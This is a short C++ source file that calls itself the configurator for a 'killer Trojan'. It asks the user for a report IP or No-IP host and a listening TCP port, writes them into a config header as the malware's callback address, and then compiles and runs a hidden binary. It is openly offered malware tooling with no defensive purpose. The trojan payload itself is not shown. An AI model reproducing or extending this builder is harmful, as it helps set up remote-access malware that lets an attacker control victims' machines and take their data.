/**

Configger # 1.0 BY ABDO10 , killer Trojan 

**/
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
using namespace std ; 

int main(){


	char path[100] = {"src/config.h"} ;
	string ip_address ; 
	ofstream set_config ; 
	int PORT ;  
	
	cout << " +> Enter Your Report [IP/HOST] Address : " ;
	getline(cin,ip_address);
	cout << " +> Enter Your Listening [TCP] PORT : " ;
	cin >> PORT ; 

	cout << " [*] Saving Info... " << endl;

	set_config.open(path); 
	if (set_config.fail()){
	cerr  << " [-] Something Error Detected , Please Re-Install Me! " << endl;
	return 1; 

	} 
	else {
	set_config << "	// NO-IP Dns Or IP Address Below:" << endl;  
	set_config << "	char host_address[99999] = {\""<< ip_address << "\"};"<<  endl ; 
	set_config << "	// TCP PORT Below:" << endl; 
        set_config << "	static int PORT = " << PORT << " ; " << endl;  
	cout << " [+] Config Has Been Saved!" << endl;
	
	system("g++ src/info.cpp -o pkgs/.info");
	system("./pkgs/.info");   
	}



	return 0; 

}
